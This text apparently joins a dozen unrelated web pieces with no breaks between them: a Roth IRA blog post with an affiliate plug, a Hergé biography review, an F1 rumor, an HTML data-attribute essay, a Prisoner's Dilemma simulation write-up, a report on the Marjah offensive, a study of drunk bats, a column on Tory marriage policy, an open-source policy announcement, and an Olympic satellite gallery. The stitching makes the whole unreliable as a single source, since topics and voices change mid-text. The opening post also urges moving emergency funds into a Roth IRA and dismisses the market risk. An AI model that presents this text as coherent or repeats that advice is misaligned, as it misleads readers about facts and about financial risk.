The Cost of Delaying
I know so many people who wait until the end of the year ( some even wait until April the following year ) to max out their Roth IRA .
They wait , then they deposit the full $ 5,000 into the account .
Why ?
Losing a year of tax free gains is the same as saying no when the cashier offers you a 15 % off coupon to use on your purchase .
Maybe you do n’t need the money , but it ’s a fool ’s choice no doubt .
There are many theories of how much money a decision like this costs but it does n’t matter .
Money is money , big or small .
Okay I ’m Convinced , But This is Only Possible If I ’m Rich
You do n’t have to be rich .
All you have to do is move $ 5,000 of your emergency funds into the Roth IRA now .
WHAT ?.?
I know .
This sounds like dumb advice , but did you know that you can withdraw all of your Roth IRA contributions ?
Since you wo n’t be contributing to your Roth IRA if you actually need the funds in an emergency , you can safely assume that it will be the same thing as withdrawing it if you need it .
Investments Could Fall in Value
The caveat is that your investments could tank at the time when you need the money the most .
This might happen , but I suspect that if you ’ve been reading MoneyNing for a while , you are responsible enough and this worry will motivate you to save more .
If you end up spending less until you save that emergency funds back up to a comfortable level , that ’s just side benefit .
A Little About Emergency Funds
I always think the conventional idea of an emergency fund , while great , is a little too conservative .
If ultimate safety gives you the piece of mind and confidence to take more risks elsewhere ( example : career ) , then great .
If not , then perhaps there ’s a slightly better way to use your money .
Automatic Works Too
Some people also contribute to their retirement accounts via the automatic method .
If this is you , ignore this as you are doing just fine .
Automatic contributions have other benefits so I wo n’t change anything ( that ’s the whole point of setting it on auto pilot anyway ) .
Your Turn
I understand this is one of those “ sounds interesting but this is not for me ” type strategy , but what do you think ?
If there are any holes with using the emergency funds this way , please point them out for everyone ’s benefit .
I look forward to hearing your thoughts .
Editor 's Note : I 've begun tracking my assets through Personal Capital .
I 'm only using the free service so far and I no longer have to log into all the different accounts just to pull the numbers .
And with a single screen showing all my assets , it 's much easier to figure out when I need to rebalance or where I stand on the path to financial independence .
They developed this pretty nifty 401K Fee Analyzer that will show you whether you are paying too much in fees , as well as an Investment Checkup tool to help determine whether your asset allocation fits your risk profile .
The platform literally takes a few minutes to sign up and it's free to use by following this link here .
For those trying to build wealth , Personal Capital is worth a look .
To really write for children , you have to think like a child .
And to read a children ’s book , you probably have to let go of grown - up reasoning .
These thoughts occurred to me as I read two newly - translated books about Tintin and his creator , Georges Remi , better known to the world as Hergé .
( The pen name is composed of Remi ’s initials backwards , pronounced as in French . )
There is much to be learned from these studies and others by “ Tintinologists ” — about Hergé , about the “ world ” of Tintin , even about twentieth - century politics .
But as I read Pierre Assouline ’s well - written biography of Hergé and Jean - Marie Apostolidès ’s erudite study of the Tintin books , a version of the question we Jews love to ask kept coming to mind :
Are they good for Tintin ?
As Assouline admits in the preface to his book , Georges Remi is not the easiest subject for a biography .
Born in Brussels in 1907 , he had a conventional bourgeois childhood , only temporarily interrupted by World War I .
He fully and unquestioningly imbibed the right - wing Catholic politics of that milieu .
In adulthood , he was a workaholic and a private man : he left behind no personal journal and his letters , which Assouline employs liberally , offer little insight into his inner life .
He lived even his most passionate love affairs with a quiet complacency .
And he rarely left Belgium before the last decades of his life .
A reader cannot help but feel a deep blandness in Remi .
Assouline , a journalist , makes the best of the grey - all - over Georges Remi by exploring the contrasts between his life and the colorful figures he invented , Tintin and Hergé .
The boy reporter , unlike Remi , is virtually stateless and always ready to set out across the globe on a new adventure .
They were physical opposites as well : fans who met the lanky , long - faced Remi were sometimes surprised to find that he did not have Tintin ’s round face , small stature , or tuft of blond hair .
But the most extreme contrast between them , as Assouline tells it , was moral .
Although Remi and Tintin had a similar moral code , rooted in the Catholic scout movement of Remi ’s childhood , they felt and acted in very different ways .
Remi seemed to experience injustice only obliquely and he very rarely took action against it .
Tintin , on the other hand , always leaps to the defense of an injured party and metes out instant , rough justice .
The moral divide between Remi and Tintin - Hergé yawned widest during and after World War II .
Remi chose to spend the war in his German - occupied homeland , where he continued to work unmolested , thanks to longtime links to right - wing figures .
The help of powerful collaborators enabled him to publish new adventures in spite of a severe wartime paper shortage .
Most damningly , he accepted work with a Belgian newspaper , Le Soir , which had been confiscated by the authorities to serve as a propaganda organ .
The German - controlled paper published , among other things , defenses of fascism and anti-Semitic screeds .
Hergé ’s cartoons provided a great boost to the paper ’s popularity in the face of a boycott of its pages by many well - known Belgian writers and artists .
Indeed , his role led the resistance , on the eve of the liberation , to brand him one of the forty leading journalist collaborators .
After the war , as he sought to defend himself from charges of incivisme ( which may be roughly translated as “ disloyalty ” ) , Remi explained his conduct during the war as a kind of aesthetic quietism .
Artists such as himself , he argued , had no special obligation to take a stand against political evil : they had a higher calling .
This stance did not prevent him from being arrested , nor did it get him out of jail — his fame as the father of Tintin eventually got the charges dropped — but it did apparently assuage his own conscience .
To the end of his life , he took virtually no responsibility for his wartime behavior .
If there 's a team with as many troubles as USF1 it 's Campos Meta1 .
Now sources tell us USF1 may team up / acquire Meta1 .
Are two struggling teams better than one ?

The buzz we 've been told by a key supplier source is USF1 is having quite a lot of trouble with FIA crash testing and the team is caught in a battle between older F1 engineers wanting to talk about the problem and younger engineers just wanting to do it .
The solution ?
Combine the Campos Meta1 team and the USF1 team and hope against hope one of the cars , two of the drivers and some combination of remaining sponsors can get enough together to make a few races .

We wonder if maybe it is n't the other way around since it seems Campos has a better sponsorship setup than USF1 right now .
Also , ESPN is reporting Campos will announce a new funding solution soon .
Could their funding solution be YouTube founder and possibly former USF1 - sponsor Chad Hurley , thus creating a rumor that USF1 is buying Campos ?
Granted , this is all a crazy rumor , but crazy rumors are all we have right now .
As for their website being down overnight , USF1 insisted through their twitter account it 's nothing to look into :
The US F1 Team web server is down and is being repaired as this is written .
We are not gone , as many have reported .
More news soon .

Put that data-* attribute away , son ... You might hurt someone
27 JAN
HTML 5 data-* attributes allow us to add custom attributes to elements as long as they are prefixed with ‘ data - ’ and since this was first discussed on John Resig ’s blog I ’ve been interested in how people will use and abuse this feature .
I greeted the feature with mixed feelings .
It ’s definitely a simple way to enrich the semantic value of HTML pages as well as helping to improve some of the more toxic parts of Microformats .
XML namespaces are definitely a more complete solution but this is a simple and immeadiately adoptable means to add invisible semantic data to HTML documents .
However , as John hinted in his post , there ’s an enormous temptation for JavaScript authors to use this to embed configuration data for their scripts directly into HTML .
Many developers have been itching for an excuse to do this for a long time .
Some just added attributes willy - nilly like crazy web standards bandits , some would love to do add arbiturary configuration into their HTML but felt a bit squeamish about moving away from the HTML specs and opted to abuse the class attribute from within the standard .
For the record , I ’d tend to side with the former .
If it works and there ’s a good reason for it then I say do it .
However , back then I explained why there is no good reason to add unsemantic configuration data into your HTML and now that we have standards - approved carte - blanche to do this I ’d like to reiterate that it ’s still not the way forward .
If you ’ve not read that article then its worth a quick read before you go on .
By all means , use data-* attributes to add semantically valuable data to your HTML but if you are just using it to prop up a script you are writing think again .
An Example
If you ’ve not already watched it go now and watch Yehuda ’s Screencast on evented programming with jQuery .
The ideas in here represent a massive progression in client - side scripting .
It ’s nothing short of essential viewing .
However , it also happens to be the latest example I ’ve come across of needless use of data-* attributes and , while not wanting to take away from how progressive and clever the content is as a whole , I feel the need to use it as my counter - example for this article .
In the screencast , Yehuda is creating a tab interface .
The markup he proposes is something like this :
< ul class = " tabs " > < li data - content = " first " >
First </ li > < li data - content = " second " > Second </ li > < li data - content = " third " >
Third < / li > </ul > < div class = " pane " id =" first " >
Some content </ div > < div class = " pane " id =" second " >
Some content </ div > < div class = " pane " id =" third " class= " selected " >
Some content</div >
The idea being that when the tab < li > is clicked the script then interrogates data - content to decide which div to show .
However , without the JavaScript operating on this the HTML has no semantical value .
The < li>s are just list elements ( and will be read as such by assistive technologies ) .
In fact , the browser does n’t know that those list elements are in anyway associated with < div >s below .
Here ’s how I think it should be marked up :
< ul class=" section - nav " > < li >< a href= " #first " >
First </a></li> < li >< a href= " #second " > Second </a></li> < li >< a href= " #third " >
Third </a></li> </ul > < div class=" section " id =" first " >
Some content </ div > < div class=" section " id =" second " >
Some content </ div > < div class=" section " id =" third " >
Some content</div >
Now , before we even add JavaScript we have links that we can click that will jump you to the specified content .
If you click the back button you will jump back to the previous tab ’s content .
With this in place you could even make tabs work solely by using CSS and the : target pseudo - selector .
If you wanted to go HTML 5 crazy you could even use < nav > and < section > elements which would further enhance the semantics of the document .
By correctly associating the tab link and the tab content we can take advantage of the browsers facilities to navigate this type of content even before we get out the old JavaScript crowbar .
With this markup as a base it ’s then just as trivial to hook in the script but instead of interogatting data - content we just look at the anchor of the link .
Because we are now using anchors , users can deep link into a particular tab , it would be trivial to support the back button and assistive technologies will make better sense of it , amoung other things .
Leave Yehuda Alone !
Of course , I ’m picking apart what was a very simple and purposefully contrived example , but as usage of data -* attributes picks up , it ’s important to not abuse this facility and to continue find as many semantic hooks for your scripts as possible .
It may now be a “ standard ” but it does n’t mean that its a good solution .
When looking for hooks for my scripts , this is the process I follow :
1. Build up your markup to be as meaningful as possible .
If it submits a request it should be a < form > , if its linking to another piece of content it ’s an < a > .
Even if you ’re building a very complex piece of UI seek to build as much of it as you can into your document ( while keeping the semantics intact ) before you go anywhere near your JavaScript .
2 . Write your script to take advantage of the semantics your HTML document has to offer .
This will get you a long way in many cases , however , you may well find that there is still configuration information you need to pass into your script .
Rather than turn to data-* attributes its best to consider inferring this information via context in the same way that CSS does .
This way you can assert things like “ all < input >s with type ‘ slider ’ and a class ‘ day ’ have a min of 1 and a max of 31 ” then you can change this in one place rather than visiting each element ’s data -* attributes individually .
Read this article for more detail on how to do that .
We do n’t need to change the heading colour in every single heading element in our site now we have CSS , let ’s not start doing that kind of thing again now we have data -* attributes .
I welcome the data-* attribute .
It ’s a simple and immediately useful method to add custom semantic data to HTML documents .
Just avoid using it to litter implementation - specific crap into your documents :)
In the previous post , we discussed the Prisoner ’s Dilemma and saw how a simple strategy called Tit - for - Tat enforced the Golden Rule and won a very interesting contest .
But does Tit - for - Tat always come out on top ?
The most confounding thing about the strategy is that it can never win – at best , it can only tie other strategies .
Its success came from avoiding the bloody battles that other more deceptive strategies suffered .
The major criticism of Axelrod ’s contest is its artificiality .
In real life , some may say , you do n’t get to encounter everyone , interact with them , and then have a tally run at the end to determine just how you did .
Perhaps more deceptive strategies would do better in a more “ natural ” environment where losing does n’t mean you get another chance at another opponent , but that your failures cause you to simply die off .
Artificial Nature
So now let ’s look at the same game , with the same scoring system , only this time there ’s a twist .
Assume that this contest takes place in some sort of ecosystem that can only support a certain number of organisms , and they must fight among each other for the right to reproduce .
There will be many different organisms , and they will all be members of a certain species , or specific strategy .
We can then construct an artificial world where these strategies can battle it out in a manner that seems to reflect the real world a bit better .
In order to determine supremacy , we ’ll play a certain number of rounds of the game , called a generation .
At the end of the generation , the scores are tallied for each strategy , and a new generation of strategies is produced – with a twist .
Higher scoring strategies will produce more organisms representing them in the next generation , while lower scoring strategies will produce less .
Repeat this for many generations , observe the trends , and we can see how these strategies do as part of a population that can grow and shrink , rather than a single strategy that lives forever .
So let ’s look at an example .
Suppose we have a population that consists of the following simple strategies :
Initial
Population Strategy Description 60 % ALL -C Honest to a fault , this strategy always cooperates .
20 % RAND
The lucky dunce , this strategy defects or cooperates at random .
10 % Tit - for - Tat
This strategy mimics the previous move of the other player , every time .
10 % ALL -D
The bad boy of the bunch , this strategy always defects .
So what will happen ?
Was Tit - for - Tat ’s dominance a result of the structure of the contest , or is it hardier than some might think ?
A graph of the changing populations over 50 generations may be seen below .
It ’s a hard world to start .
ALL -C immediately starts being decimated by the deception of ALL - D and RAND who start surging ahead , while Tit - for - Tat barely hangs on .
ALL - D’s relentless deception allows it to quickly take the lead , and it starts knocking off its former partner in crime , RAND .
Tit - for - Tat remains on the ropes , barely keeping its population around 10 % as ALL-C and RAND are quickly eliminated around it .
And then something very interesting happens .
ALL - D runs out of easy targets , and turns to the only opponents left – Tit - for - Tat and itself .
Tit - for - Tat begins a slow climb as ALL - D begins to eat itself fighting over scraps .
Slowly , steadily , Tit - for - Tat maintains its numbers by simply getting along with itself while allowing ALL - D to destroy each other .
By 25 generations it ’s all over – the easy resources exhausted , ALL- D was unable to adapt to the new environment and Tit - for - Tat takes over .
This illustrates a very important concept – that of an evolutionarily stable strategy .
ALL - D was well on its way to winning , but left itself open to invasion by constant infighting .
ALL -C initially had the highest population but was quickly eaten away by more deceptive strategies .
Tit - for - Tat on the other hand was able to get along with itself , and defended itself against outside invaders that did not cooperate in turn .
An evolutionarily stable strategy is something that can persist in this manner – once a critical mass of players start following it , it cannot be easily invaded or exploited by other strategies , including itself .
I Ca n’t Hear You
But there ’s one critical weakness to Tit - for - Tat .
We ’re all aware of feuds that have gone on for ages , both sides viciously attacking the other in retaliation for the last affront , neither one precisely able to tell outsiders when it all started .
And if we look at the strategies each use in a simplistic sense , it seems that they ’re using Tit - for - Tat precisely .
So how did it go so horribly wrong ?
It went wrong because Tit - for - Tat has a horrible weakness – its memory is only one move long .
If two Tit - for - Tat strategies somehow get stuck in a death spiral of defecting against each other , there ’s no allowance in the strategy to realize this foolishness , and be the first to forgive .
But how could this happen ?
Tit - for - Tat is never the first to defect after all , so why are both Tit - for - Tat strategies continually defecting ?
The answer is that great force of nature , noise .
A message read the wrong way , a shout misheard over the wind , an error in interpretation – all can be the impetus for this first initial defection .
No matter that it was pointless and incorrect , the strategy has changed .
While Tit - for - Tat ’s greatest strength is that it never defects first , its greatest weakness is that it never forgives first either .
All of these simulations we ’ve seen so far do not include noise , and it can have a catastrophic effect on the effectiveness of Tit - for - Tat .
Its success was built on the strategy of never fighting among itself and allowing other deceptive strategies to destroy themselves by doing the same – but with noise , this advantage becomes a fatal weakness as Tit - for - Tat ’s inability to be taken advantage of is turned against itself .
So what does a simulation including noise look like ?
You can see one below , and it contains an additional mystery strategy , Pavlov .
Pavlov is very similar to Tit - for - Tat but slightly different – it forgives far more easily .
We see a similar pattern to our previous simulation .
ALL - D has an initial population spike as it knocks off the easy targets , but Tit - for - Tat and Pavlov slowly climb to supremacy with ALL - D eventually eating scraps .
But the influence of noise causes Tit - for - Tat to fight among itself , and Pavlov begins what previously seemed impossible – to begin to win against Tit - for - Tat .
Puppy Love
So what is Pavlov and why does it work better in a noisy environment like the real world ?
Well , Ivan Pavlov was the man who discovered classical conditioning .
You probably remember him as the guy who fed dogs while ringing a bell , and who then just rang the bell – and discovered that the dogs salivated expecting food .
The strategy is simple – if you win , keep doing it .
If you lose , change your approach .
Pavlov will always cooperate with ALL-C and Tit - for - Tat .
If it plays ALL - D however , it will hopefully cooperate , lose , get angry about it and defect , lose again , switch back to cooperation , and so on .
Like a tiny puppy or the suitor of a crazy girlfriend , it ca n’t really decide what it wants to do , but it ’s going to do it ’s damndest to try to succeed anyways .
It manages to prevent the death spiral of two Tit - for - Tat strategies continually misunderstanding each other by obeying a very simple rule – if it hurts , stop doing it .
While it may be slightly more vulnerable to deceptive strategies , it never gets stuck in these self - destructive loops of behavior .
So there ’s a lesson here – life is noisy , and people will never get everything correct all the time .
Tit - for - Tat works very well for a wide variety of situations , but has a critical weakness where neither player in a conflict is willing or able to forgive .
So the next time you ’re in a situation like that , step back , use your head , and switch strategies – it ’s what this little puppy would want you to do , anyways .
HELMAND PROVINCE , Afghanistan –NATO troops in Afghanistan launched their biggest offensive of the war early Saturday , attacking what they call the last Taliban stronghold in a war - scarred southern province .
Military officials said the offensive — dubbed Operation Moshtarak — got under way at 2 a.m. ( 4:30 p.m. ET Friday ) .
By about 8 a.m. ( 10 p.m. ET Friday ) two firefights had erupted between the Taliban and U.S. Marines in Marjah .
The offensive turned a main bazaar near the city center into a ghost town after residents were warned to leave the area .
NATO forces said they are following a directive not to shoot at civilians , some of whom are still on the streets .
" Insurgents who do not accept the government 's offer to reintegrate and join the political process will be met with overwhelming force , " the International Security Assistance Force Joint Command said in a statement .
" However , the strongest of measures will be taken to protect the civilian population . "
Some of about 15,000 troops from the United States , United Kingdom , Canada and Afghanistan attacked Taliban targets in and around Marjah , a city of 80,000 to 100,000 where the Taliban has set up a shadow government , coalition military authorities said .
" Marjah is the last enemy sanctuary in the Marine area of operations , " said Brig .
Gen. Larry Nicholson , 2nd Marine Expeditionary Brigade - Afghanistan commanding general .
" This operation is designed to reconnect the people of Marjah with the legitimate government of Afghanistan .
We are fully partnered with the Afghan government for this operation , and we have the resources we need to be successful . "
The Afghan government described the offensive - carried out in central Helmand with the Afghan National Army , Afghan National Police , ISAF Regional Command ( South ) , and the Helmand Provincial Reconstruction Team - as " clearing " operations .
Moshtarak , a Dari word for " together , " symbolizes the fact that combined forces are serving alongside one another .
The coalition said its troops expected to confront up to 1,000 entrenched Taliban fighters .
It expected foreign Taliban fighters to battle to the death but is prepared for local Taliban members in Marjah to try to escape .
“ We will follow the enemies and bring them to justice , ” said Gen. Mohiyiden Ghori of the Afghan National Army .
In the past few days , forces from Afghanistan , Britain and other nations have conducted air and ground operations to prepare for the assault and dropped leaflets in and around Marjah warning residents not to allow the Taliban to
enter their homes .
The allies had been unusually vocal in describing their plans for the assault .
( Related : Why the military publicized operations )
“ I think there ’s a certain strength in the Pashtunwali culture just from laying it out there in saying , ‘ Hey , we are coming .
Deal with it , ’ ” U.S. Marine Gen. Larry Nicholson has said .
Some of the 30,000 additional U.S. troops that President Barack Obama sent to Afghanistan will take part in the fight .
The goal is to force the Taliban from Marjah so that people there can live free of Taliban influence and drug traffickers in a province with a major source of the world ’s opium .
It ’s an example of a U.S. strategy to focus on population centers and separate the Taliban from Afghan civilians .
( Related : Why Marjah , why now ? )
“ It ’s about the security of the population , not fighting down insurgent numbers , ” British Gen. Gordon Messenger has said .
About 3,000 U.S. Marines are involved in the fight .
The advance notice given to residents will help avert civilian casualties , a problem that has hurt the military ’s credibility among Afghans .
They are also trying to get those Taliban who are n’t hard - core to turn in themselves and their weapons .
Reaching the battleground could be one of the biggest challenges for NATO and Afghan troops .
It ’s a tough terrain hard to cross with tanks .
The town of Marjah is surrounded by a deadly ring of roadside bombs , military officials say .
They say the Taliban has had months to plant bombs in the ground , most of them homemade mixes of ammonium nitrate , shrapnel fuel , salt or flour .
Such bombs have caused about 80 percent of the deaths in past fighting in Helmand province , military officials said .
They are detonated remotely or by pressure plates .
“ This is possibly the largest IED threat NATO has ever faced , ” Nicholson has said .
Massive armored vehicles , called assault breacher vehicles , were to lead the charge into Marjah , coalition authorities said before the offensive .
The tank - like vehicles can destroy roadside bombs .
Even with their help , though , military officials have increased staff at the hospital at Camp Bastion , in the capital of Helmand province , in anticipation that roadside bombs would cause casualties .
Troops also expect to encounter booby - trapped houses , as well as fierce urban combat .
" Drunk " bats have no trouble flying under the influence , a new study says .
Tropical bats of Central and South America regularly eat fermenting fruits and nectar .
But they can fly and use their built - in " sonar " just as well while inebriated as while sober — even with blood - alcohol contents that would exceed legal limits for people .
( See more pictures of Central American bats . )
" We went into the study fully expecting that some of the species would n’t be able to hold their drink , " said study co-author Brock Fenton , a biologist at the University of Western Ontario in Canada .
But " the bats , unfortunately , had n’t read the proposal , " he said .
Buzzed Bats
In April 2009 Fenton and colleagues caught 106 bats representing six different species in northern Belize .
The team gave the bats either sugar water or ethanol — the intoxicating agent in liquors — in amounts proportional to the bats ' body weights .
The scientists then took saliva samples to gauge the bats ' blood - alcohol content ( BAC ) .
Some bats had a BAC of more than 0.3 percent — in all 50 U.S. states , it 's illegal to drive with a BAC of 0.08 percent .
The flying mammals were placed in a closed obstacle course on the forest floor .
" It ’s like walking a straight line , " Fenton quipped , referring to a common test given to suspected drunk drivers by police — except to succeed , the bats had to maneuver around hanging plastic chains without crashing .
The team also recorded the bats ' echolocation calls to see if they'd " slur their words , " Fenton said .
Bats use echolocation — sound waves that bounce off objects — to sense prey and to navigate .
( Interactive : Hear bat calls . )
Surprising the scientists , the buzzed bats passed both tests with flying colors .
( Related : " Extinct Walking Bat Found . " )
Lightweights to Lushes
The team also discovered that the bat species had varying blood - alcohol contents , suggesting a spectrum of tolerance .
Fenton compared such variation to people , saying there are some who just " sniff the cork [ and ] they ’re gone and others who can soak up two or three bottles and do n’t show any sign of impairment . "
What 's more , tolerance in bats — as in humans — may be dictated in part by how often and how much a bat drinks .
For example , a previous study in Israel had shown that drunk Egyptian fruit bats crashed more frequently in experiments than the New World bats did , Fenton said .
New World bats may handle alcohol better because they eat more fermented foods than Old World bats , according to the study , published February 1 in the online journal PLoS One .
New World bats ' high tolerance may have afforded them an evolutionary edge , Fenton added , since they could handle eating fruits that other animals could n't .
This alcohol tolerance may even explain why Central and South American bat species are so much more diverse than in other regions .
Whatever happened to the Tory party of the 1980s that refused to use taxpayers ' money to prop up failing industries making things people did n't want ?
That told us sternly , usually in a helmet of hair - lacquer , " the market must decide " ?
It turns out the Tories are n't so laissez - faire if the market makes a decision they do n't approve of – particularly when punters turn their backs on one of their most cherished institutions .
With fewer people getting married now than at any time since records began in 1862 , the Tories – who despite what they say about free markets , always know best how people should live their lives – have decided to effectively take this failed enterprise into public ownership .
This weekend a former Tory MP from the 1980s , who considers himself culturally progressive , came out in support of David Cameron 's promised tax breaks for married couples .
" From this day forward , reward married couples " announced Matthew Parris in the Times .
He failed , however , to explain why married couples should be " rewarded " – as well as given wedding presents .
But then so has DavidCameron .
But the article 's standfirst succinctly summarised both Parris ' and the Tory position , and made it clear why an explanation is n't necessary : " Everyone except a sour minority knows that marriage is good for society " .
Marriage is good for society because it is a " good thing " in and of itself – as such it does n't need to be demonstrated , even at a time when marriage is less popular than ever .
Marriage is , for most Tories , an article of faith .
And anyone who disagrees with this position or even questions it is obviously sour or leftwing , which amounts to much the same thing .
What made Parris ' support of this tax on unmarried people ( for that is of course what it translates into ) novel was his interesting claim to speak on behalf of the vast majority of gay people : " an astonishingly conservative section of society " , commending their " traditionalism " , warning the ( presumed heterosexual and conservative ) reader who begs to differ they 've been paying too much attention to a " sour slim minority " , and asserting gays ' overwhelming endorsement of the proposed subsidy for married couples .
Parris even went a step further than Cameron and called for civil partnerships to be excluded from the " reward " – perhaps because being famously gay himself , Parris can't be easily accused of homophobia .
Now , maybe I 'm just a sour lefty minority homo of exactly the kind that Parris warns you against , but at least I know better than to presume to speak on gay men's behalf – especially when it comes to counting yourself out of tax breaks .
But since Parris has raised the matter of sexuality , I feel obliged , like the bad fairy at the wedding , to point out where this policy is coming from : essentially the same bit of the Nasty Party that brought you Section 28 in the 1980s , with its jihad on " pretended family relationships " , though it is now more closeted .
Section 28 , you may remember , is the same anti-gay law that the main champion of the Tory marriage subsidy , the Catholic convert Iain Duncan Smith , wanted to reinstate in 2002 when he was Tory leader .
This piece of legislation grew directly out of Tory and tabloid fears that marriage was being undermined by acceptance of homosexuality .
Section 28 was essentially a nannyish backlash against the scandalous notion that schools might tell young people they have choices about who and how they were going to love .
Now that " pretended family relationships " – straight and gay and everything in between – are probably in the majority and Section 28 is a discredited , embarrassing memory , Holy Family Tories such as IDS have to adopt a different , " nicer " approach – one that seems more carrot than stick , more utilitarian and less homophobic .
But do n't doubt for a minute that one of the biggest attractions of what we should probably call " Section 29 " for the IDS tendency is that tax breaks for married / decent people is a satisfying way of sticking it to unmarried / indecent people .
Tories , particular the older ones who make up the majority of the party 's aging membership and who give IDS his power base , have never really reconciled themselves to the massive cultural changes that happened post - 1960s – and which were much accelerated by their market and consumer reforms in the 1980s .
For all her " Victorian values " , Broken Britain was broken in large part by Thatcher .
I doubt that Cameron believes for a minute that his Terry and June subsidy will turn back the clock and make marriage or Austin Allegros fashionable again , and he probably does n't really want to anyway , but it 's nice that he 's figured out a way to buy off the IDS tendency that so distrusts him and what they see as his cultural liberalism – with taxpayers ' money .
I can't help but feel a little sorry for Parris though .
It can't have been easy being a gay Tory MP in the 1980s – at least if you had , as I 'm sure he has , a conscience .
But it seems that all his futile attempts to convince his Cro-Magnon colleagues back then that most gays are natural Tories and worshippers of the Holy Family despite their penchant for buggery has taken its toll .
He now believes his own rhetoric .
This guest post was written by San Francisco Mayor Gavin Newsom , who was elected to the position in 2003 and reelected in 2007 .
In this guest post , Mayor Newsom announces a new open source software policy for San Francisco and discusses the benefits of choosing open source technology .
One of the greatest technology changes of our times is the rise of open source software .
It represents a different way of developing software , one that is public by its very nature .
The underlying source code is not copyrighted and therefore available free of charge to read , modify , and build upon .
Update : Based on feedback , we plan on using the open source definition from the Open Source Initiative .
Thanks to all that pointed this out .
This new definition will be reflected in our policy .
Open source software is created by the people for the people and as such is ideal for government .
To that goal , I am extremely proud to announce today the nation ’s first open source software policy for city government .
San Francisco's new policy requires city departments to consider open source software equally with commercial products when purchasing new software .
The opportunities with open source are tremendous : lower costs , greater agility , better reliability , improved security , and increased innovation .
Under the leadership of our City CIO , Chris Vein , and the Department of Technology , we have witnessed the benefits of open source with shorter implementation times and lower costs .
We have seen this with my web site , DataSF.org , RecoverySF.org and our 311 integration with Twitter .
Open Government is Already Paying Dividends
Moving forward , there is an opportunity to save millions of dollars in software costs by using open source software .
We are only scratching the surface .
We can and must do more in the face of historic budget deficits .
Our new open source policy requires the City to choose new technology wisely .
This is just the beginning of the Open Gov movement in San Francisco , but our early efforts are paying off .
Since the launch of DataSF last summer , the City ’s clearinghouse of government datasets , we have seen our tech community create new services and products never dreamed of within the walls of government .
And now we are giving people access to technology systems like our 311 call center through open source , so they can decide how and when they interact with government .
We face many challenges today , none more urgent than the economic crisis , but with it comes an opportunity to seek new ways of governing .
In San Francisco , like other cities , we are using this opportunity to engage our greatest resource , the public , to build a government that works better for all of us .

The Secret Nuclear Dossier Intelligence from Tehran Elevates Concern in the West
The West has long been suspicous of Iran 's nuclear program .
SPIEGEL has obtained new documents on secret tests and leadership structures that call into question Tehran 's claims to be exclusively interested in the peaceful use of the technology .
The Olympics have been held in some of the most scenic locations on Earth , and this year is no exception .
Some of the most breathtaking moments of the games involve details captured in photo finishes in cross country skiing and hooked ski tips leading to crashes in the slalom seen in slow - motion video .
All that aside , Vancouver is equally breathtaking from above .
Vancouver beat out Pyeongchang , South Korea , and Salzburg , Austria , to host Canada 's third Olympics .
The city has delivered beautiful , sunny weather that is unfortunately too warm for ideal snow conditions , giving the grounds crews some major challenges .
Snow has been trucked in for some of the events .
This gallery collects images taken from space by astronauts and satellite of a few of the more interesting and attractive Olympic host cities from 1900 to 2016 .
Vancouver , British Columbia — — — — — —— ——
The image above , taken by the Landsat - 7 satellite in December , shows the entire Vancouver - Whistler area .
The ski resort can be seen in the upper left corner of the image and in the closeup below .

Athens , Greece — — — —
–
As the 2004 Olympic Games approached , all of Greece held its breath , waiting to see if Athens would complete construction of all the venues in time .
While much of the world doubted the city and second guessed the IOC 's decision to send the Olympics back to its birthplace , Athens worked night and day and made the deadline .
But just barely .
The dust had n't quite settled at some venues when competition began .
Some of the 15,000 spectators who watched the United States lose to Puerto Rico sat on temporary folding chairs on planks of plywood in the not - quite - finished Helliniko Indoor Arena .
It was the first U.S. loss of an Olympic basketball game since NBA players began competing .
The image above , taken by GeoEye's IKONOS satellite on June 24 , 2004 shows the Athens Olympic Sports Complex .
In the bottom half of the photo is the Olympic Stadium where the opening and closing ceremonies were held .
The Olympic Indoor Hall , which hosted gymnastics and the basketball finals is the large square building near the center of the image , and to its left is the outdoor Olympic Aquatic Center .
To the right is the Olympic Tennis Center and toward the top of the image is the Olympic Velodrome .
The image below , taken in June 2004 by astronauts on the International Space Station , shows some of the brand - new venues on the outskirts of the city including the Faliro Coastal Zone Olympic Complex on the coast near the center of the image where the handball , taekwondo , volleyball and beach volleyball competitions take place .
Also on the coast , near the bottom of the image , is the Helliniko Olympic Complex , which held the canoeing and kayaking , baseball and softball , fencing and hockey events .
The Acropolis is near the very center of the image .

Paris — –
The first modern Olympics was held in Athens in 1896 .
Paris hosted the second games in 1900 and the eighth in 1924 .
The city made it to the final selection round for the 2012 Olympics , but lost to London , which become the first city to host the games three times .
The 1900 summer games included a swimming obstacle race with things like fences and boats for the competitors to navigate .
Sadly , this event was never seen again at the Olympics , along with equestrian long jump and two - day cricket .
It would be too awesome to watch Michael Phelps climbing out of the water to jump off a platform and then dive under a string of floating barrels .
Another highlight was the first Olympic medal won by a person of African descent when Constantin Henriquez de Zubiera won a silver in the tug of war .
The 1924 Olympics saw the first use of a 50 - meter - long pool with marked lanes for races .
In gymnastics , 23 men were awarded a perfect 10 in the rope - climbing event , which has since been discontinued .
The image above was taken by astronauts on the International Space Station in January 2008 .
Though many of the venues are no longer there , the Hippodrome d'Auteuil can be seen as an oval - shaped patch of green in the park in the upper left corner .

Beijing — —-
The 2008 Summer Olympics in Beijing made the news for a number of reasons beyond the actual competition .
The grand , unique architecture of the ambitious Olympic complex was both captivating and controversial .
But the city got even more press for its dismal air quality .
The image above , taken July 12 , 2008 by DigitalGlobe 's WorldView - 1 satellite , shows the Beijing National Stadium , known as the " Bird 's Nest , " just two weeks after it was completed .
To the south of the stadium is the Olympic Sports Center Gymnasium where the handball competition was held , the Ying Tung Natatorium which housed the water polo games and the Olympic Sports Center Stadium where the pentathlon and equestrian events took place .
To the west is the Water Cube which held the swimming and diving competition .
The arched building north of the Water Cube is National Indoor Stadium which held the gymnastics events .
And north of this is the Fencing Hall .

Salt Lake City — — ——
–
The 2002 Winter Olympic Games in Salt Lake City had their fair share of controversy , beginning with a bribing scandal involving members of the committee that selected the host city .
The controversy continued into the figure skating competition where a French judge said she had been pressured to vote for the Russian pairs team which pushed them to victory over the Canadian favorites Jamie Sale and David Pelletier .
In the end , both pairs were awarded gold .
Another controversial moment came when American Apolo Anton Ohno was given a gold medal in short - track speed skating after Korean Kim Dong - Sung was disqualified .

Barcelona , Spain — — — — —-
Barcelona lost out to Berlin in a bid to host the 1936 Olympics before getting the 1992 summer games .

Fit für die Zukunft : Wirtschaftsregion Schleswig- Holstein
Windenergie , maritimer Flair , neue Technologien oder auch die Logistik der Zukunft , all dies und noch viele weitere interessante Themen sind Teil der jährlich stattfindenden Wirtschaftskonferenz in Schleswig - Holstein .
